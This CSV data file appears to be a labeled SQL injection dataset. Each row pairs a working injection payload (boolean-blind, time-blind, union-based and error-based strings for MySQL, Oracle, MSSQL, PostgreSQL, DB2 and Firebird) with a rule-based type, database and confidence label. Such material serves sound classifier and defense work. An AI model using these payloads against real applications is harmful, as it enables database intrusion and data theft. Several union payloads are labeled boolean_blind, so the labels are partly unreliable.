id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19144,1' ) where 2090 = 2090,boolean_blind,generic,0.75,Token match: 'where 2090 = 2090' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19145,1' and 1661 = 1244 and 'dcha' = 'dcha,boolean_blind,generic,0.85,Token match: 'and 1661 = 1244' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19146,"-1372%' ) ) ) union all select 8403,8403,8403,8403#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19147,1 where 9774 = 9774,boolean_blind,generic,0.75,Token match: 'where 9774 = 9774' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19148,1 ) ) and 3249 = 2985,boolean_blind,generic,0.85,Token match: 'and 3249 = 2985' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19149,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19150,"1' ) as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",boolean_blind,generic,0.85,Token match: 'where 6184 = 6184' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19151,"1 ) ) as jfae where 6684 = 6684 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.85,Token match: 'where 6684 = 6684' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19152,"1 ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.65,"Token match: 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19153,"1' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token match: 'elt (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type)",2
19154,"1"" ) ) as tmpz where 7224 = 7224 and make_set ( 3579 = 1045,1045 ) --",boolean_blind,generic,0.85,Token match: 'where 7224 = 7224' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19155,"-1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.85,Token match: 'where 1181 = 1181' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19156,"1"" where 1132 = 1132 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",boolean_blind,postgresql,0.75,"Token match: 'where 1132 = 1132', 'pg_sleep (' → boolean_blind (P3); DB=postgresql via \bpg_sleep\b; sources confirm (c_type)",2
19157,1' where 1153 = 1153 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,boolean_blind,mysql,0.75,"Token match: 'where 1153 = 1153', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (c_type)",2
19158,"1'|| ( select 'hrpa' where 1973 = 1973 union all select null,null,null,null,null,null,null,null,null--",boolean_blind,generic,0.75,"Token match: 'where 1973 = 1973', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19159,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'rgue' like 'rgue",time_blind,oracle,0.95,Token match: 'dbms_pipe.receive_message' → time_blind (P5); DB=oracle via \bdbms_pipe\b; sources confirm (a_type+c_type),3
19160,"1"" ) where 2215 = 2215 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",boolean_blind,oracle,0.75,"Token match: 'where 2215 = 2215', 'xmltype (' → boolean_blind (P3); DB=oracle via \bxmltype\b; sources confirm (c_type)",2
19161,1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) # bkjl,time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19162,1 ) as ilqx where 8547 = 8547,boolean_blind,generic,0.75,Token match: 'where 8547 = 8547' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19163,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19164,"1' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.75,Token match: 'char ( 109 ) ||char' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19165,"1"" ) where 6236 = 6236 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",boolean_blind,mysql,0.75,"Token match: 'where 6236 = 6236', 'benchmark (' → boolean_blind (P3); DB=mysql via \bbenchmark\b; sources differ (a=time_blind,c=heavy_query) — payload tokens prevail",1
19166,"1"" ) ) and ( 7467 = 7962 ) *7962 and ( ( ""nhld"" = ""nhld",boolean_blind,generic,0.75,Token match: ') *7962 and' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19167,1 ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 6062 = 6062,boolean_blind,firebird,0.75,Token match: 'case 6240 when' → boolean_blind (P3); DB=firebird via rdb\$; sources confirm (a_type+c_type),3
19168,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'xiyl' like 'xiyl",heavy_query,generic,0.65,"Token match: 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19169,select ( case when ( 7852 = 7476 ) then 7852 else 7852* ( select 7852 from mysql.db ) end ) #,boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19170,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'eqfh' = 'eqfh,time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19171,"-1475"" ) union all select 8611,8611,8611#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19172,"1' ) as saqp where 6612 = 6612 union all select null,null,null,null,null,null,null--",boolean_blind,generic,0.75,"Token match: 'where 6612 = 6612', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19173,"1' ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.65,"Token match: 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' → heavy_query (P4); DB=db2 via \bsysibm\.; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19174,select ( case when ( 5752 = 6036 ) then 1 else 5752* ( select 5752 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.75,Token match: 'case when' → boolean_blind (P3); DB=mssql via \bsysdatabases\b; sources confirm (a_type+c_type),3
19175,1'|| ( select 'sbft' where 8748 = 8748,boolean_blind,generic,0.85,Token match: 'where 8748 = 8748' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19176,"1"" ) where 2180 = 2180 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.85,Token match: 'where 2180 = 2180' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19177,"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#",boolean_blind,oracle,0.75,"Token match: 'where 6205 = 6205', 'union all select' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19178,"1"" where 8089 = 8089",boolean_blind,generic,0.75,Token match: 'where 8089 = 8089' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19179,-2936 ) or 6872 = 6872,boolean_blind,generic,0.85,Token match: 'or 6872 = 6872' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19180,"1'|| ( select 'ryom' where 1134 = 1134 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.75,Token match: 'where 1134 = 1134' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19181,"1%' ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19182,"1'|| ( select 'xjtq' from dual where 5719 = 5719 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",boolean_blind,oracle,0.85,"Token match: 'where 5719 = 5719', 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type)",3
19183,"1%"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""%"" = """,time_blind,mysql,0.95,Token match: 'benchmark (' → time_blind (P5); DB=mysql via \bbenchmark\b; sources confirm (a_type),2
19184,"1%"" ) rlike ( select ( case when ( 7736 = 7642 ) then 1 else 0x28 end ) ) and ( ""%"" = """,boolean_blind,mysql,0.95,Token match: 'rlike (' → boolean_blind (P3); DB=mysql via \brlike\b; sources confirm (a_type+c_type),3
19185,1' ) and 7533 = 7533 and ( 'dbjq' = 'dbjq,boolean_blind,generic,0.85,Token match: 'and 7533 = 7533' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19186,"1"" ) where 9827 = 9827",boolean_blind,generic,0.75,Token match: 'where 9827 = 9827' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19187,"1"" ) as lrew where 6067 = 6067 union all select null,null,null,null,null,null,null#",boolean_blind,generic,0.75,"Token match: 'where 6067 = 6067', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19188,"1 ) as hlit where 4973 = 4973 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",boolean_blind,mysql,0.75,"Token match: 'where 4973 = 4973', 'extractvalue (', 'benchmark (' → boolean_blind (P3); DB=mysql via \bextractvalue\b; sources differ (a=error_based,c=heavy_query) — payload tokens prevail",1
19189,"1 ) as obhj where 1789 = 1789 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",boolean_blind,oracle,0.75,"Token match: 'where 1789 = 1789', 'dbms_pipe.receive_message' → boolean_blind (P3); DB=oracle via \bdbms_pipe\b; sources differ (a=time_blind,c=time_blind) — payload tokens prevail",1
19190,1' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,boolean_blind,oracle,0.75,"Token match: 'where 1502 = 1502', 'xmltype (' → boolean_blind (P3); DB=oracle via \bxmltype\b; sources confirm (c_type)",2
19191,"1' ) union all select null,null,null,null,null,null,null--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19192,"1%"" waitfor delay '0:0:5' and ""%"" = """,time_blind,mssql,0.95,Token match: 'waitfor delay' → time_blind (P5); DB=mssql via \bwaitfor\s+delay\b; sources confirm (a_type+c_type),3
19193,1' ) ) and 4242 = 5831 and ( ( 'xflh' like 'xflh,boolean_blind,generic,0.85,Token match: 'and 4242 = 5831' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19194,"-5278"" ) ) ) union all select 5264,5264,5264#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19195,-3462' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'cxku' like 'cxku,boolean_blind,oracle,0.65,"Token match: 'case when', 'utl_inaddr.get_host_address' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=error_based,c=error_based) — payload tokens prevail",1
19196,1'|| ( select 'boib' where 9595 = 9595,boolean_blind,generic,0.85,Token match: 'where 9595 = 9595' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19197,"1%' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,Token match: 'dbms_pipe.receive_message' → time_blind (P5); DB=oracle via \bdbms_pipe\b; sources confirm (a_type+c_type),3
19198,"-4934"" union all select 5119,5119,5119,5119,5119--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19199,"1%' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( '%' = '",boolean_blind,mysql,0.95,"Token match: 'elt (', 'updatexml (' → boolean_blind (P3); DB=mysql via \bupdatexml\b; sources confirm (a_type)",2
19200,"1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.75,Token match: 'char ( 109 ) ||char' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19201,"1'|| ( select 'vixv' from dual where 7704 = 7704 union all select null,null,null,null,null--",boolean_blind,oracle,0.75,"Token match: 'where 7704 = 7704', 'union all select' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19202,"1%"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19203,"1'|| ( select 'fbsr' where 7899 = 7899 and elt ( 4249 = 4249,7259 ) ) ||'",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type+c_type),3
19204,"1' ) where 6056 = 6056 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.95,"Token match: 'elt (', 'union select' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type)",2
